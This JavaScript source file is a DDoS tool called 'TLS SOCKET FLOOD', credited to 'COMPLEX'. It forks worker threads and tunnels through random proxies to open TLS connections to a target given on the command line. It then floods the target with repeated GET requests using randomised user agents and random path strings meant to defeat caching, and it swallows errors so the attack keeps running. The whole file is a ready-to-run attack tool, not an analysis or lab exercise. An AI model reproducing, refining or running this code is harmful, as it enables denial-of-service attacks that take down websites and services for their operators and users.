/*

**          TLS SOCKET FLOOD v1.2                   **
**          MADE BY COMPLEX                         **
**          %RAND% SUPPORTED                        **
**          Memory leak fixed                       **

*/
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
(ignoreNames = [
  "RequestError",
  "StatusCodeError",
  "CaptchaError",
  "CloudflareError",
  "ParseError",
  "ParserError",
  "DeprecationWarning",
]),
  (ignoreCodes = [
    "ECONNRESET",
    "ERR_ASSERTION",
    "ECONNREFUSED",
    "EPIPE",
    "EHOSTUNREACH",
    "ETIMEDOUT",
    "ESOCKETTIMEDOUT",
    "EPROTO",
    "DEP0123",
    "ERR_SSL_WRONG_VERSION_NUMBER",
  ]);

process
  .on("uncaughtException", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("unhandledRejection", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("warning", (e) => {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("SIGHUP", () => {
    return 1;
  })
  .on("SIGCHILD", () => {
    return 1;
  });

//const request = require("request");
var http = require("http");
var tls = require("tls");
const fs = require("fs");
const cluster = require("cluster");
const url = require("url");
const random_ua = require('random-ua');
const syncRequest = require("sync-request");

//attack setup
var target = process.argv[2];
const time = process.argv[3];
const requestIP = process.argv[4];
const threads = process.argv[5];
const host = url.parse(target).host;
/*
var PROXYURL = `https://api.proxyscrape.com/v2/account/datacenter_shared/proxy-list?auth=ih4bqgny30vgwgprvvrh&type=displayproxies&country[]=all&protocol=http&format=normal&status=all`;

log('[info] Loading proxies..');

//loading proxies
var res = syncRequest("GET", PROXYURL, {
      headers: {
        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
      },
    });
    var proxies = res.getBody("utf8").replace(/\r/g, "").split("\n"); */
var proxies = fs
  .readFileSync("proxy.txt", "utf-8")
  .toString()
  .replace(/\r/g, "")
  .split("\n");
/*
let Tls_connecT =
  "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA";
*/
function between(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function log(string) {
  let d = new Date();

  let hours = (d.getHours() < 10 ? "0" : "") + d.getHours();
  let minutes = (d.getMinutes() < 10 ? "0" : "") + d.getMinutes();
  let seconds = (d.getSeconds() < 10 ? "0" : "") + d.getSeconds();

  console.log(`[${hours}:${minutes}:${seconds}] ${string}`);
}

function randString(length) {
  var _ = "";
  var characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    _ += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return _;
}

//SETTING REQUEST HEADERS
function loadSettings(target, host) {
  var rw =
    `GET ` +
    target +
    " HTTP/1.3\r\nHost: " +
    host +
    "\r\nReferer: " +
    target +
    "\r\nOrigin: " +
    target +
    "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nuser-agent: " +
    random_ua.generate() +
    "\r\nUpgrade-Insecure-Requests: 1\r\n" +
    "Accept-Encoding: br\r\nContent-Type: *\r\nAlt-Used: " +
    target +
    "\r\nAccept-Language: en-US,en;q=0.9\r\n" +
    "Cache-Control: max-age=0\r\n" +
    `Connection: Keep-Alive\r\n\r\n`;
  return rw;
}

function starter() {
  if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
      cluster.fork();
    }
    cluster.on("exit", (worker, code, signal) => {
      //console.log(`Threads: ${worker.process.pid} ended`);
    });
  } else {
    flooder();
    log(`[info] Thread started on host: ${target}`);
  }

  //flooder
  function flooder() {
    setInterval(function () {
      if (target.indexOf("%RAND%") !== -1) {
        targetreplaced = target.replace(/%RAND%/g, randString(16));
      }else{
        targetreplaced = target;
      }
      var aa = between(1, proxies.length);
      var proxy = proxies[Math.floor(Math.random() * aa)];
      proxy = proxy.split(":");

      const agent = new http.Agent({
        keepAlive: true,
        keepAliveMsecs: 50000,
        maxSockets: Infinity,
      });

      var req = http.request(
        {
          host: proxy[0],
          port: proxy[1],
          headers: {
            Host: host,
            "Proxy-Connection": "Keep-Alive",
            Connection: "Keep-Alive",
          },
          method: "CONNECT",
          path: host + ":443",
        },
        function () {
          req.setSocketKeepAlive(true);
        }
      );

      req
        .on("connect", function (res, socket, head) {
          var TlsConnection = tls.connect(
            {
              host: host,
              ciphers:
                "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA" +
                ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
              secureOptions: "SSL_OP_ALL",
              requestCert: true,
              servername: host,
              secure: true,
              rejectUnauthorized: false,
              sessionTimeout: 10000,
              socket: socket,
            },
            function () {
              for (let j = 0; j < requestIP; j++) {
                TlsConnection.setKeepAlive(true, 10000);
                TlsConnection.setTimeout(10000);
                TlsConnection.write(loadSettings(targetreplaced, host));
              }
            }
          );

          TlsConnection.on("data", (chunk) => {
            delete chunk;
            setTimeout(function () {
              return delete TlsConnection;
            }, 10000);
          });
        })
        .end();
    }, 0.2);
  }
}

starter();

setTimeout(() => {
  console.clear();
  log(`[success]Attack finished`);
  process.exit(1);
}, time * 1000);